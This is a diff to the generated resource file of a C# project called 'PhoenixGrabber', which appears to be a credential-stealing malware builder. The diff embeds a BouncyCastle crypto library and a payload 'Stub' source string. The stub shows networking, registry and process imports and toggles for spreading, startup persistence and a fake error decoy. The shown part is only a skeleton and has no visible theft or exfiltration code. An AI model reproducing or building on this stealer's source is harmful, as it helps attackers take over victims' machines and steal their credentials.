@@ -61,28 +61,39 @@ namespace PhoenixGrabber.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] BouncyCastle_Crypto {
+            get {
+                object obj = ResourceManager.GetObject("BouncyCastle_Crypto", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to using Microsoft.Win32;
-        ///using Newtonsoft.Json;
-        ///using Newtonsoft.Json.Linq;
-        ///using Org.BouncyCastle.Crypto.Engines;
-        ///using Org.BouncyCastle.Crypto.Modes;
-        ///using Org.BouncyCastle.Crypto.Parameters;
         ///using System;
+        ///using System.Collections.Generic;
+        ///using System.Diagnostics;
         ///using System.IO;
-        ///using System.Linq;
         ///using System.Net;
         ///using System.Reflection;
-        ///using System.Security.Cryptography;
-        ///using System.Text;
         ///using System.Text.RegularExpressions;
         ///using System.Threading;
         ///using System.Windows.Forms;
+        ///using System.Web.Script.Serialization;
         ///
         ///namespace Program
         ///{
         ///    static class Program
         ///    {
-        ///        # [rest of string was truncated]&quot;;.
+        ///        #region Main
+        ///        static void Main()
+        ///        {
+        ///            Start();
+        ///            //SpreadMode
+        ///            //RunOnStartup
+        ///            //FakeErr [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
